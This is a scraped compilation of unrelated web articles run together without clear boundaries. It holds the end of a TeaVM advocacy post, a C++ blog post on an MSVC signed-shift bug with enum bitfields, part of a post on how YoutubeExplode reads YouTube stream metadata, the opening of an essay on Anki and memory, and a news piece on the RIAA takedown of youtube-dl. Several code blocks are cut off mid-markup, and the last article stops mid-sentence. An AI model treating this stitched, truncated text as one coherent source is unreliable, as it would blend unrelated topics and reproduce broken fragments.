Whatever path you choose, you'll find that writing your client-side in
the same language as your backend is a truly liberating experience.
Share data structures throughout your app.  Use your IDE to refactor
interfaces and model classes in the client and server simultaneously.
Use the same tooling (build tool, dependency management,
static/dynamic analysis tools) for your entire product.  Productivity
and developer satisfaction are dramatically improved.

<h3>How To Move Forward</h3>

TeaVM is ready for use in your projects.  It is stable, documented,
and has <a href="https://github.com/konsoletyper/teavm-flavour/tree/master/example">example</a>
<a href="https://github.com/konsoletyper/teavm/tree/master/samples/hello">code</a>
on the TeaVM site, as well as <a href="https://frequal.com/tea-sampler/">elsewhere</a>.

<p>

Most of all, TeaVM needs your endorsement and promotion.  Instead of
discussing and advocating legacy Java web technologies, help ensure
Java has another 25 years of success — please promote and
use TeaVM!

</p><p>

How to help?

</p><ul>
  <li> <a href="http://teavm.org/docs/intro/getting-started.html">Build your
  first TeaVM project</a>.  It takes just 2 commands.
  </li><li> <a href="https://groups.google.com/u/2/g/teavm">Read the
  forums</a> where developers discuss TeaVM and Flavour
  </li><li> <a href="https://github.com/konsoletyper/teavm">Dive into the
  source</a>.  The TeaVM and Flavour code is well-organized and
  extremely useful.  When creating your own JavaScript mappings and
  Flavour components, you have a large collection of examples to
  reference in the project codebase.
</li></ul>

Thank you for reading this.  Let's win this war together!

<![CDATA[Highway to hell: C++ enums and bitfields]]>
            </title>

October 25, 2020 | https://walac.github.io/curious-bug-enum-bitfield/ | <a href="https://web.archive.org/web/*/https://walac.github.io/curious-bug-enum-bitfield/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>C++ enums historically gave me some headaches due to the fact that compilers are free to choose the size
of the type for whatever criteria they think. This makes particularly hard to write portable code among
compilers from ABI point of view (Visual C++ vs C++ Builder, anyone?).</p>

<p>Some days ago I was debugging a problem with <a href="https://github.com/dalihub/dali-toolkit">dali-toolkit</a>
and the enum story scalated to another level.</p>

<p>Let me give you some background: <a href="https://github.com/dalihub/dali-toolkit">dali-toolkit</a> loads textures
using a background worker thread that is responsible to load the image files to memory. I was looking
why some textures didn’t load in <code>Windows</code>. To make the asynchronous loading possible it implements
a small state machine and it keeps all information about the texture in a type called <code>TextureInfo</code>.</p>

<p>Here is a partial definition of the structure:</p>

<div><div><pre><code><span>struct</span> <span>TextureInfo</span> <span>{</span>
		<span>// ....</span>
    <span>LoadState</span> <span>loadState</span><span>:</span><span>4</span><span>;</span>         <span>///&lt; The load state showing the load progress of the Texture</span>
    <span>FittingMode</span><span>::</span><span>Type</span> <span>fittingMode</span><span>:</span><span>3</span><span>;</span> <span>///&lt; The requested FittingMode</span>
    <span>Dali</span><span>::</span><span>SamplingMode</span><span>::</span><span>Type</span> <span>samplingMode</span><span>:</span><span>3</span><span>;</span> <span>///&lt; The requested SamplingMode</span>
    <span>StorageType</span> <span>storageType</span><span>:</span><span>2</span><span>;</span>     <span>///&lt; CPU storage / GPU upload;</span>
		<span>// ....</span>
<span>};</span>
</code></pre></div></div>

<p>All these custom types are enums defined elsewhere. Yes, you read right, enums + bit fields, what
possibly can go wrong? To illustrate the root cause of the bug, let’s write a toy sample:</p>

<div><div><pre><code><span>enum</span> <span>Animal</span> <span>{</span>
    <span>Cat</span><span>,</span>
    <span>Dog</span><span>,</span>
    <span>Horse</span><span>,</span>
    <span>Turtle</span><span>,</span>
<span>};</span>

<span>enum</span> <span>Breed</span> <span>{</span>
    <span>BorderCollie</span><span>,</span>
    <span>GoldenRetriever</span><span>,</span>
    <span>GermanShepard</span><span>,</span>
    <span>Husky</span><span>,</span>
<span>};</span>

<span>enum</span> <span>Adopted</span> <span>{</span>
    <span>No</span><span>,</span>
    <span>Yes</span><span>,</span>
<span>};</span>

<span>struct</span> <span>AnimalInfo</span> <span>{</span>
    <span>Animal</span> <span>animal</span><span>:</span><span>2</span><span>;</span>
    <span>Breed</span> <span>breed</span><span>:</span><span>2</span><span>;</span>
    <span>Adopted</span> <span>adopted</span><span>:</span><span>1</span><span>;</span>

    <span>AnimalInfo</span><span>(</span><span>Animal</span> <span>a</span><span>,</span> <span>Breed</span> <span>b</span><span>,</span> <span>Adopted</span> <span>ad</span><span>)</span>
        <span>:</span> <span>animal</span><span>(</span><span>a</span><span>),</span> <span>breed</span><span>(</span><span>b</span><span>),</span> <span>adopted</span><span>(</span><span>ad</span><span>)</span> <span>{}</span>
<span>};</span>

<span>int</span> <span>main</span><span>(</span><span>void</span><span>)</span> <span>{</span>
    <span>AnimalInfo</span> <span>animal</span><span>(</span><span>Animal</span><span>::</span><span>Dog</span><span>,</span> <span>Breed</span><span>::</span><span>GermanShepard</span><span>,</span> <span>Adopted</span><span>::</span><span>Yes</span><span>);</span>

    <span>auto</span> <span>breed</span> <span>=</span> <span>animal</span><span>.</span><span>breed</span><span>;</span>

    <span>return</span> <span>sizeof</span><span>(</span><span>AnimalInfo</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Now, using <a href="https://godbolt.org/">godbolt</a>, we can view the assembly code generated by different compilers.
In particular, let’s look at the assembly code for the <code>main</code> function. Firstly, the the gcc generated
code. I added comments to the parts interesting to us:</p>

<div><div><pre><code>main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 16
        lea     rax, [rbp-8]
        mov     ecx, 1
        mov     edx, 2
        mov     esi, 1
        mov     rdi, rax
        call    AnimalInfo::AnimalInfo(Animal, Breed, Adopted)
        movzx   eax, BYTE PTR [rbp-8] // load the information
        shr     al, 2   	// breed is in the bits 2 and 3, so shift right 2 bits
        and     eax, 3  	// breed is only two bits long
        movzx   eax, al  	// eax = breed value
        mov     DWORD PTR [rbp-4], eax // store it in our variable
        mov     eax, 4    // AnimalInfo is 4 bytes long
        leave
        ret
</code></pre></div></div>

<p>Here is clang. It uses different registers but is essentially the same code:</p>

<div><div><pre><code>main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 16
        mov     dword ptr [rbp - 4], 0
        lea     rdi, [rbp - 8]
        mov     eax, 1
        mov     esi, eax
        mov     edx, 2
        mov     ecx, eax
        call    AnimalInfo::AnimalInfo(Animal, Breed, Adopted)
        mov     r8b, byte ptr [rbp - 8]
        shr     r8b, 2
        and     r8b, 3
        movzx   eax, r8b
        mov     dword ptr [rbp - 12], eax
        mov     eax, 4
        add     rsp, 16
        pop     rbp
        ret
</code></pre></div></div>

<p>Now the msvc compiler:</p>

<div><div><pre><code>main PROC
$LN3:
  sub rsp, 56 ; 00000038H
  mov r9d, 1
  mov r8d, 2
  mov edx, 1
  lea rcx, QWORD PTR animal$[rsp]
  call AnimalInfo::AnimalInfo(Animal,Breed,Adopted) ; AnimalInfo::AnimalInfo
  mov eax, DWORD PTR animal$[rsp]
  shl eax, 28
  sar eax, 30 // OH NO! SIGNED SHIFT!!!
  mov DWORD PTR breed$[rsp], eax
  mov eax, 4
  add rsp, 56 ; 00000038H
  ret 0
main ENDP
</code></pre></div></div>

<p>Before commenting about the bug generated by msvc, let me praise the compiler optimizer,
it could get the breed value in two instructions, while clang and gcc needed three.
Very smart! Too bad that code is wrong. I think it is better to undestand the issue if we
view the bit layout of the word holded by AnimalInfo:</p>

<div><div><pre><code>	-------------------------------------
	|  31-5  |    4    |  3-2  |  1-0   |
	-------------------------------------
	| Unused | Adopted | Breed | Animal |
	-------------------------------------
</code></pre></div></div>

<p>So, the code shifts 28 bits to left, moving <code>Breed</code> to the bits 31 and 30, then it
shifts 30 bits to the right, but it does a signed shift, filling the
shifted bits with the value of the most significant bit. The <code>Breed</code> value is
<code>GermanShepard</code>, which is 2. So, when we shift left, the bit 31 will hold the value
1, and when we shift right, we end up with the final value <code>0xfffffffe</code>! The reason this happens
is because msvc assumes the enum is a signed integer by default and, combined with
the use of bit fields, yields the bug. This is precisely what happened in
<a href="https://github.com/dalihub/dali-toolkit">dali-toolkit</a>.</p>

<p>Once we understood the problem, we can solve it easily by forcing the enum to an unsigned integer:</p>

<div><div><pre><code><span>enum</span> <span>class</span> <span>Animal</span><span>:</span> <span>unsigned</span> <span>int</span> <span>{</span>
    <span>Cat</span><span>,</span>
    <span>Dog</span><span>,</span>
    <span>Horse</span><span>,</span>
    <span>Turtle</span><span>,</span>
<span>};</span>

<span>enum</span> <span>class</span> <span>Breed</span><span>:</span> <span>unsigned</span> <span>int</span> <span>{</span>
    <span>BorderCollie</span><span>,</span>
    <span>GoldenRetriever</span><span>,</span>
    <span>GermanShepard</span><span>,</span>
    <span>Husky</span><span>,</span>
<span>};</span>

<span>enum</span> <span>class</span> <span>Adopted</span><span>:</span> <span>unsigned</span> <span>int</span> <span>{</span>
    <span>No</span><span>,</span>
    <span>Yes</span><span>,</span>
<span>};</span>

<span>struct</span> <span>AnimalInfo</span> <span>{</span>
    <span>Animal</span> <span>animal</span><span>:</span><span>2</span><span>;</span>
    <span>Breed</span> <span>breed</span><span>:</span><span>2</span><span>;</span>
    <span>Adopted</span> <span>adopted</span><span>:</span><span>1</span><span>;</span>

    <span>AnimalInfo</span><span>(</span><span>Animal</span> <span>a</span><span>,</span> <span>Breed</span> <span>b</span><span>,</span> <span>Adopted</span> <span>ad</span><span>)</span>
        <span>:</span> <span>animal</span><span>(</span><span>a</span><span>),</span> <span>breed</span><span>(</span><span>b</span><span>),</span> <span>adopted</span><span>(</span><span>ad</span><span>)</span> <span>{}</span>
<span>};</span>

<span>int</span> <span>main</span><span>(</span><span>void</span><span>)</span> <span>{</span>
    <span>AnimalInfo</span> <span>animal</span><span>(</span><span>Animal</span><span>::</span><span>Dog</span><span>,</span> <span>Breed</span><span>::</span><span>GermanShepard</span><span>,</span> <span>Adopted</span><span>::</span><span>Yes</span><span>);</span>

    <span>auto</span> <span>breed</span> <span>=</span> <span>animal</span><span>.</span><span>breed</span><span>;</span>

    <span>return</span> <span>sizeof</span><span>(</span><span>AnimalInfo</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Now the generated code does what it is supposed to do:</p>

<div><div><pre><code>main PROC
$LN3:
  sub rsp, 56 ; 00000038H
  mov r9d, 1
  mov r8d, 2
  mov edx, 1
  lea rcx, QWORD PTR animal$[rsp]
  call AnimalInfo::AnimalInfo(Animal,Breed,Adopted) ; AnimalInfo::AnimalInfo
  mov eax, DWORD PTR animal$[rsp]
  shr eax, 2
  and eax, 3
  mov DWORD PTR breed$[rsp], eax
  mov eax, 4
  add rsp, 56 ; 00000038H
  ret 0
main ENDP
</code></pre></div></div>

        </div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Almost a year ago, I started developing <a href="https://github.com/Tyrrrz/YoutubeExplode">YoutubeExplode</a>, a library that scraps information on YouTube videos and lets you download them. Originally, my main motivation for developing it was simply to gain experience, as the task involved a lot of research and reverse-engineering. Nowadays, YoutubeExplode is arguably the most consistent and robust .NET library for dealing with YouTube.</p>
<p>Since this is a relatively popular discussion topic among many beginner developers, I thought that I could help out by sharing the knowledge I found by spending dozens of hours staring at Chrome Developer Tools.</p>
<p><em>Note: even though the base principles explained here are unlikely to change, some information in this post may become outdated. This post is relevant to YoutubeExplode v4.1 (16-Feb-2018).</em></p>
<h2>Getting video metadata</h2>
<p>In order to find and resolve media streams, you need to first get video metadata. There are a few ways to do it, but the most reliable one is by querying an AJAX endpoint used internally by YouTube’s iframe embed API. The format is as follows: <a href="https://www.youtube.com/get_video_info?video_id=%7BvideoId%7D">https://www.youtube.com/get_video_info?video_id={videoId}</a>.</p>
<p>The request can take a lot of different parameters, but at a minimum it needs a video ID — the value in the URL that comes after <code>/watch?v=</code>, for example <code>e_S9VvJM1PI</code>.</p>
<p>The response contains URL-encoded metadata, which has to be decoded first before it’s usable. After that, you can map the parameter names to values in a dictionary for easier access. Some parameter values are nested objects themselves, so they can in turn be mapped to nested dictionaries.</p>
<p>Here’s an example of the decoded metadata (truncated for brevity):</p>
<div data-language="ini"><pre><code><span>status</span><span><span>=</span>ok</span>

<p>As you can see, there is quite a lot of information that can be extracted straight away.</p>
<p>Let’s also look at some important optional parameters that this request can take:</p>
<ul>
<li><code>hl</code> — name of the culture used to localize some strings. If not set, it defaults to culture inferred from your IP. Use <code>hl=en</code> to force English language on all strings.</li>
<li><code>el</code> — type of YouTube page from where the request was made. This decides what kind of information will be available in the response. In some cases, you will need to set this parameter to a certain value depending on the type of the video, in order to avoid errors. Defaults to <code>embedded</code>.</li>
<li><code>sts</code> — some kind of session identifier, used to synchronize information between requests. Defaults to empty.</li>
</ul>
<h3>The “el” parameter</h3>
<p>The <code>el</code> request parameter can take multiple values and it affects what kind of data you will receive as a response. There are only a few that actually matter though, so I’ll list them here:</p>
<ul>
<li><code>embedded</code>, the default value. YouTube uses this when requesting information for embedded videos. Doesn’t work with videos that aren’t embeddable, but works with age-restricted videos.</li>
<li><code>detailpage</code>, alternative value, contains a bit more info. Conversely, works with videos that aren’t embeddable, but doesn’t work with age-restricted videos.</li>
</ul>
<p>YoutubeExplode uses <code>el=embedded</code> for the first query. If it fails because the video cannot be embedded, it then retries with <code>el=detailpage</code>.</p>
<h3>Handling errors</h3>
<p>When the request fails, the response will contain only a few fields:</p>
<ul>
<li><code>status</code> — which is equal to <code>fail</code>.</li>
<li><code>errorcode</code> — an integer code that identifies the error.</li>
<li><code>reason</code> — text message that explains why the video is not available.</li>
</ul>
<p>Error codes seem to be very generic and most of the time it’s either <code>100</code> or <code>150</code> so they aren’t very useful at determining what went wrong.</p>
<h3>Paid videos</h3>
<p>Some videos need to be purchased before they can be watched. In such cases, there will be:</p>
<ul>
<li><code>requires_purchase</code>, which equal to <code>1</code>.</li>
<li><code>ypc_vid</code>, ID of a preview video which can be watched for free.</li>
</ul>
<h2>Resolving media streams</h2>
<p>Media streams and their metadata come in many different forms.</p>
<h3>Muxed streams</h3>
<p>Multiplexed (muxed) streams are the type that contain both video and audio tracks in the same stream. YouTube provides these streams only in low qualities — the best they can be is 720p30.</p>
<p>Metadata for these streams is contained within the URL-encoded response mentioned earlier, inside the <code>url_encoded_fmt_stream_map</code> parameter. To extract it, you simply need to split the value by <code>,</code> and then URL-decode each part.</p>
<p>This is how decoded metadata looks, for an individual muxed stream:</p>
<div data-language="ini"><pre><code><span>itag</span><span><span>=</span>43</span>
<span>type</span><span><span>=</span>video/webm; codecs="vp8.0, vorbis"</span>
<span>fallback_host</span><span><span>=</span>redirector.googlevideo.com</span>
<span>url</span><span><span>=</span>https://r12---sn-3c27sn7k.googlevideo.com/videoplayback?itag=43&amp;lmt=1367519763212098&amp;ipbits=0&amp;key=yt6&amp;mime=video%2Fwebm&amp;expire=1511401259&amp;mn=sn-3c27sn7k&amp;mm=31&amp;ms=au&amp;mv=m&amp;mt=1511379591&amp;ei=y9IVWuuyKI-YdLvnm8AO&amp;sparams=dur%2Cei%2Cgcr%2Cid%2Cinitcwndbps%2Cip%2Cipbits%2Citag%2Clmt%2Cmime%2Cmm%2Cmn%2Cms%2Cmv%2Cnh%2Cpl%2Cratebypass%2Crequiressl%2Csource%2Cexpire&amp;ip=255.255.255.255&amp;id=o-AJuM11wvxuVl2WBgfb3nr6zbmXsFGQvhMelDobZ_KOrE&amp;nh=IgpwcjAxLmticDAxKgkxMjcuMC4wLjE&amp;requiressl=yes&amp;gcr=ua&amp;source=youtube&amp;ratebypass=yes&amp;pl=24&amp;initcwndbps=1112500&amp;dur=0.000</span>
<span>s</span><span><span>=</span>9599599594B0133328AA570AE0129E58478D7BCE9D226F.15ABC404267945A3F64FB4E42074383FC4FA80F5</span>
<span>quality</span><span><span>=</span>medium</span></code></pre></div>
<p>You will be interested in the following properties:</p>
<ul>
<li><code>itag</code> — integer code that identifies the type of stream.</li>
<li><code>type</code> — MIME type and codecs.</li>
<li><code>url</code> — URL that serves the stream.</li>
<li><code>s</code> — cipher signature used to protect the stream (if present).</li>
</ul>
<p>Note: I’ve encountered cases when <a href="https://github.com/Tyrrrz/YoutubeExplode/issues/36">some of the muxed streams were removed</a> despite still appearing in the metadata. Therefore it’s recommended to send HEAD requests to check that each stream is still available. You can get content length as well while you’re at it, since it’s not present in the metadata.</p>
<h3>Adaptive streams</h3>
<p>YouTube also uses video-only and audio-only streams. These come at highest available qualities, with no limitations.</p>
<p>Similarly to muxed streams, metadata for these streams can be extracted from <code>adaptive_fmts</code> parameter. Here’s how it looks:</p>
<div data-language="ini"><pre><code><span>itag</span><span><span>=</span>134</span>

<span>init</span><span><span>=</span>0-708</span></code></pre></div>
<p>Adaptive streams have a slightly extended set of properties. I’ll list the useful ones:</p>
<ul>
<li><code>itag</code> — integer code that identifies the type of stream.</li>
<li><code>type</code> — MIME type and codecs.</li>
<li><code>url</code> — URL that serves the stream.</li>
<li><code>s</code> — cipher signature used to protect the stream (if present).</li>
<li><code>clen</code> — content length of the stream in bytes.</li>
<li><code>bitrate</code> — stream bitrate in kbit/sec.</li>
<li><code>size</code> — video resolution (video-only).</li>
<li><code>fps</code> — video framerate (video-only).</li>
</ul>
<h3>Adaptive streams in DASH manifest</h3>
<p>Video info may contain URL of a DASH manifest inside the <code>dashmpd</code> parameter. It’s not always present and some videos might never have it at all.</p>
<p>To resolve metadata of these streams, you need to first download the manifest using the provided URL. Sometimes a manifest can be protected. If it is, you should be able to find the signature inside the URL — it’s the value separated by slashes that comes after <code>/s/</code>.</p>
<p>Streams in DASH can also be segmented — each segment starting at a given point and lasting only a second or two. This is the type that your browser normally uses when playing a video on YouTube — it lets it easily adjust quality based on network conditions. Segmented streams are also used for livestream videos. This post will not be covering them, however, as processing them is not required to download videos.</p>
<p>The DASH manifest follows <a href="http://standards.iso.org/ittf/PubliclyAvailableStandards/MPEG-DASH_schema_files/DASH-MPD.xsd">this XML schema</a>. You can parse the stream metadata if you go through all descendant nodes of type <code>Representation</code>. Here’s how they appear:</p>
<div data-language="xml"><pre><code><span><span><span>&lt;</span>Representation</span> <span>id</span><span><span>=</span><span>"</span>133<span>"</span></span> <span>codecs</span><span><span>=</span><span>"</span>avc1.4d4015<span>"</span></span> <span>width</span><span><span>=</span><span>"</span>426<span>"</span></span>

      <p>
      One day in the mid-1920s, a Moscow newspaper reporter named
      Solomon Shereshevsky entered the laboratory of the psychologist
      Alexander Luria. Shereshevsky's boss at the newspaper had
      noticed that Shereshevsky never needed to take any notes, but
      somehow still remembered all he was told, and had suggested he
      get his memory checked by an expert.
    </p>

    <p>
      Luria began testing Shereshevsky's memory. He began with simple
      tests, short strings of words and of numbers. Shereshevsky
      remembered these with ease, and so Luria gradually increased the
      length of the strings. But no matter how long they got,
      Shereshevsky could recite them back.  Fascinated, Luria went on
      to study Shereshevsky's memory for the next 30 years.  In a book
      summing up his research*<span>* Alexander
      Luria, “The Mind of a Mnemonist”, Harvard University
      Press (1968).</span>, Luria reported that:
    </p>

    <blockquote>
      [I]t appeared that there was no limit either to
      the <em>capacity</em> of S.'s memory or to the <em>durability of
      the traces he retained</em>. Experiments indicated that he had
      no difficulty reproducing any lengthy series of words whatever,
      even though these had originally been presented to him a week, a
      month, a year, or even many years earlier. In fact, some of
      these experiments designed to test his retention were performed
      (without his being given any warning) fifteen or sixteen years
      after the session in which he had originally recalled the
      words. Yet invariably they were successful.
    </blockquote>
      
    <p>
      Such stories are fascinating. Memory is fundamental to our
      thinking, and the notion of having a perfect memory is
      seductive.  At the same time, many people feel ambivalent about
      their own memory. I've often heard people say “I don't
      have a very good memory”, sometimes sheepishly, sometimes
      apologetically, sometimes even defiantly.
    </p>

    <p>
      Given how central memory is to our thinking, it's natural to ask
      whether computers can be used as tools to help improve our
      memory. This question turns out to be highly generative of good
      ideas, and pursuing it has led to many of the most important
      vision documents in the history of computing. One early example
      was Vannevar Bush's 1945 proposal*<span>*
      Vannevar
      Bush, <a href="https://www.theatlantic.com/magazine/archive/1945/07/as-we-may-think/303881/">As
      We May Think</a>, The Atlantic (1945).</span> for a mechanical
      memory extender, the memex. Bush wrote:
    </p>

    <blockquote>
      A memex is a device in which an individual stores all his books,
      records, and communications, and which is mechanized so that it
      may be consulted with exceeding speed and flexibility. It is an
      enlarged intimate supplement to his memory.
    </blockquote>

    <p>
      The memex vision inspired many later computer pioneers,
      including Douglas Engelbart's ideas about the augmentation of
      human intelligence, Ted Nelson's ideas about hypertext, and,
      indirectly, Tim Berners-Lee's conception of the world wide
      web*<span>* See, for example: Douglas
      Engelbart, <a href="http://augmentingcognition.com/assets/Engelbart1962.pdf">Augmenting Human
      Intellect</a> (1962); Ted
      Nelson, <a href="https://dl.acm.org/citation.cfm?id=806036">Complex
      information processing: a file structure for the complex, the
      changing and the indeterminate</a> (1965); and Tim
      Berners-Lee, <a href="https://w3.org/History/1989/proposal.html">Information
      Management: a Proposal</a> (1989).</span>. In his proposal for
      the web, Berners-Lee describes the need for his employer (the
      particle physics organization CERN) to develop a collective
      institutional memory,
    </p>

    <blockquote>
      a pool of information to develop which could grow and evolve
      with the organization and the projects it describes.
    </blockquote>


    <p>
      These are just a few of the many attempts to use computers to
      augment human memory. From the memex to the web to wikis to
      <a href="https://orgmode.org/">org-mode</a>
      to <a href="https://en.wikipedia.org/wiki/Project_Xanadu">Project
      Xanadu</a> to attempts
      to <a href="https://users.speakeasy.net/~lion/nb/book.pdf">make
      a map of every thought a person thinks</a>: the augmentation of
      memory has been an extremely generative vision for computing.
    </p>

      <p>
	In this essay we investigate personal memory systems, that is,
	systems designed to improve the long-term memory of a single
	person. In the first part of the essay I describe my personal
	experience using such a system, named Anki. As we'll see, Anki
	can be used to remember almost anything. That is, Anki makes
	memory a <em>choice</em>, rather than a haphazard event, to be
	left to chance. I'll discuss how to use Anki to understand
	research papers, books, and much else. And I'll describe
	numerous patterns and anti-patterns for Anki use. While Anki
	is an extremely simple program, it's possible to develop
	virtuoso skill using Anki, a skill aimed at understanding
	complex material in depth, not just memorizing simple facts.
      </p>

      <p>
	The second part of the essay discusses personal memory systems
	in general. Many people treat memory ambivalently or even
	disparagingly as a cognitive skill: for instance, people often
	talk of “rote memory” as though it's inferior to
	more advanced kinds of understanding. I'll argue against this
	point of view, and make a case that memory is central to
	problem solving and creativity. Also in this second part,
	we'll discuss the role of cognitive science in building
	personal memory systems and, more generally, in building
	systems to augment human cognition.  In a future
	essay, <a href="http://augmentingcognition.com/taylip.html">Toward a Young Lady's Illustrated
	Primer</a>, I will describe more ideas for personal memory
	systems.
      </p>

      <p>
	The essay is unusual in style. It's not a conventional
	cognitive science paper, i.e., a study of human memory and how
	it works. Nor is it a computer systems design paper, though
	prototyping systems is my own main interest. Rather, the essay
	is a distillation of informal, <em>ad hoc</em> observations
	and rules of thumb about how personal memory systems work. I
	wanted to understand those as preparation for building systems
	of my own. As I collected these observations it seemed they
	may be of interest to others. You can reasonably think of the
	essay as a how-to guide aimed at helping develop virtuoso
	skills with personal memory systems. But since writing such a
	guide wasn't my primary purpose, it may come across as a
	more-than-you-ever-wanted-to-know guide.
      </p>

      <p>
	To conclude this introduction, a few words on what the essay
	won't cover. I will only briefly discuss visualization
	techniques such as memory palaces and the method of loci.  And
	the essay won't describe the use of pharmaceuticals to improve
	memory, nor possible future brain-computer interfaces to
	augment memory. Those all need a separate treatment. But, as
	we shall see, there are already powerful ideas about personal
	memory systems based solely on the structuring and
	presentation of information.
      </p>

      <h2>Part I: How to remember almost anything: the Anki
      system</h2>

    <p>
      I'll begin with an account of my own experience with the
      personal memory
      system <a href="https://apps.ankiweb.net/">Anki</a>*<span>*
      I've no affiliation at all with Anki. Other similar systems
      include <a href="https://mnemosyne-proj.org/">Mnemosyne</a>
      and <a href="https://supermemo.com/">SuperMemo</a>. My limited
      use suggests Mnemosyne is very similar to Anki.  SuperMemo runs
      only on Windows, and I haven't had an opportunity to use it,
      though I have been influenced by essays on
      the <a href="https://supermemo.com/">SuperMemo
      website</a>.<p>I won't try to hide my enthusiasm for Anki
      behind a respectable facade of impartiality: it's a significant
      part of my life. Still, it has many limitations, and I'll
      mention some of them through the essay. </p></span>. The material
      is, as mentioned above, quite personal, a collection of my own
      observations and informal rules of thumb.  Those rules of thumb
      may not apply to others; indeed, I may be mistaken about how
      well they apply to me. It's certainly not a properly controlled
      study of Anki usage!  Still, I believe there is value in
      collecting such personal experiences, even if they are anecdotal
      and impressionistic. I am not an expert on the cognitive science
      of memory, and I'd appreciate corrections to any errors or
      misconceptions.
    </p>

    <!--
      <p>
	Before we begin, a warning. Systems such as Anki are, in my
	opinion, powerful, and the early parts of the essay sound like
	a sales pitch.  It's certainly true that Anki has become an
	important part of my life. But it's also required a great deal
	of work to learn to use well. As we'll discuss, it required
	several failed attempts to make it worth using. So it's not a
	panacea; later, we'll discuss some shortcomings and possible
	improvements. That said, I do believe the underlying
	principles are powerful and important and deserve serious
	consideration.
      </p>
      -->
    
      <p>
	At first glance, Anki seems nothing more than a computerized
      flashcard program. You enter a question:
    </p>

   <p><img src="http://augmentingcognition.com/assets/Anki_question.png"></p><p>
      And a corresponding answer:
    </p>

    <p><img src="http://augmentingcognition.com/assets/Anki_answer.png"></p><p>
      Later you'll be asked to review the card: that is, shown the
      question, and asked whether you know the answer or not.
    </p>

    <p>
      What makes Anki better than conventional flashcards is that it
      manages the review schedule. If you can answer a question
      correctly, the time interval between reviews gradually
      expands. So a one-day gap between reviews becomes two days, then
      six days, then a fortnight, and so on. The idea is that the
      information is becoming more firmly embedded in your memory, and
      so requires less frequent review. But if you ever miss an
      answer, the schedule resets, and you again have to build up the
      time interval between reviews.
    </p>

    <p>
      While it's obviously useful that the computer manages the
      interval between reviews, it perhaps doesn't seem like that big
      a deal.  The punchline is that this turns out to be a far more
      efficient way to remember information.
    </p>

    <p>
      How much more efficient?
    </p>

    <p>
      To answer that question, let's do some rough time estimates.  On
      average, it takes me about 8 seconds to review a card. Suppose I
      was using conventional flashcards, and reviewing them (say) once
      a week. If I wanted to remember something for the next 20 years,
      I'd need 20 years times 52 weeks per year times 8 seconds per
      card. That works out to a total review time of just over 2 hours
      for each card.
    </p>

    <p>
      By contrast, Anki's ever-expanding review intervals quickly rise
      past a month and then out past a year. Indeed, for my personal
      set of Anki cards the average interval …</p></div></div>

                    <p><br>Friday night on the 23<sup>rd</sup> of October the ‘Recording Industry Association of America, Inc. (RIAA)’ sent a <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md">DMCA request </a>to GitHub asking that the popular YouTube downloading software ‘youtube-dl’ be taken down. GitHub responded as by immediately removing the repositories and 17 forked pieces of software from it’s site.</p><figure><img src="https://news.perthchat.org/content/images/2020/10/Screener.png" alt="" srcset="https://news.perthchat.org/content/images/size/w600/2020/10/Screener.png 600w, https://news.perthchat.org/content/images/size/w1000/2020/10/Screener.png 1000w, https://news.perthchat.org/content/images/2020/10/Screener.png 1405w" sizes="(min-width: 720px) 720px"></figure><p>Most DMCA notices are regarding the unauthorised distribution of a particular piece of media, and they request that a media be taken down. This DMCA notice was different since it’s targeting tools that can be used to reproduce copyrighted media.</p><p>Youtube-DL is licensed under the <a href="https://en.wikipedia.org/wiki/Unlicense">Unlicense</a>, an anti-copyright license that promises ownership of the software to the public domain. As such it is usually considered lawful to freely distribute the software itself. There are many other places you can find copies of this software besides the current maintainers GitHub page.</p><div><p>The notice claimed the youtube-dl software was a ‘Anticircumvention Violation’ as well as a violation of YouTube’s terms of service. It requested that:</p><p><em>“In light of the above noted copyright infringements and anticircumvention violations, we ask that you immediately take down and disable access to the youtube-dl source code at all of its locations where it is hosted on GitHub, including without limitation those locations in the representative list set forth above.”</em></p></div><p>It also draws attention to the examples featured in the youtube-dl source code which include examples of how to download copyrighted music from Icona Pop, Justin Timberlake and Taylor Swift. The notice also claimed that:</p><p><em>“The clear purpose of this source code is to (i) circumvent the technological protection measures used by authorised streaming services such as YouTube, and (ii) reproduce and distribute music videos and sound recordings owned by our member companies without authorization for such use.”</em></p><p>Although the youtube-dl software cannot be used to distribute music, only to reproduce it. It’s also possible to use youtube-dl to reproduce public domain or creative commons work that people do have the right to copy and redistribute.</p><p>For now the software remains widely distributed and used. It can still be accessed through the <a href="https://yt-dl.org/download.html">existing yt-dl.org website.</a> Last year the RIAA was <a href="https://torrentfreak.com/riaa-delists-youtube-rippers-from-google-using-rare-anti-circumvention-notices-191108/">able to get 5 YouTube ‘ripper’ sites removed from the Google search engine.</a></p><figure><img src="https://news.perthchat.org/content/images/2020/10/Screener-1.png" alt="" srcset="https://news.perthchat.org/content/images/size/w600/2020/10/Screener-1.png 600w, https://news.perthchat.org/content/images/size/w1000/2020/10/Screener-1.png 1000w, https://news.perthchat.org/content/images/2020/10/Screener-1.png 1366w" sizes="(min-width: 720px) 720px"></figure><h3 id="perthchat-news-interview-with-philipp-hagemeister">Perthchat News Interview With Philipp Hagemeister</h3><p><br>I reached out to previous maintainer Phillip Hagemeister, who had this to say about the incident:</p><p><strong>Are you worried you will see any personal damages from this?</strong></p><blockquote>I received a seize and desist letter from German lawyers a couple of weeks ago. However, there are a number of technical inaccuracies in that letter; in particular the lawyers did not seem to have understood that my maintainership of youtube-dl ended years ago. Since this is an ongoing legal issue, that's all I'll say about that.</blockquote><p><strong>Are you going to change the examples in the source code and remove references to the copyrighted works of Icona Pop, Justin Timberlake and Taylor Swift?</strong></p><blockquote>I am no longer involved in the youtube-dl project, but if I were:</blockquote><blockquote>I would remove the test cases. These videos were never fully downloaded anyways; they are automated test cases where the test just downloads the first 10KB, which amounts to a couple of seconds at most. This is certainly fair use, but the project is fully functional without these test cases.</blockquote><blockquote>I would remove the referenced code, even though I believe it to be legal. It's an extremely small part of youtube-dl (which despite the name supports over 1000 other sites apart from YouTube) and not worth the trouble for me. I respect those who argue that the code should remain unchanged though, or that only music videos should be excluded.</blockquote><p><strong>Do you have any other comments about the incident?</strong></p><blockquote>youtube-dl is very valuable for many purposes: It enables video playback on devices where the web interface is not suitable (e.g. Raspberry Pis), it allows playback for disabled users, it powers research projects which 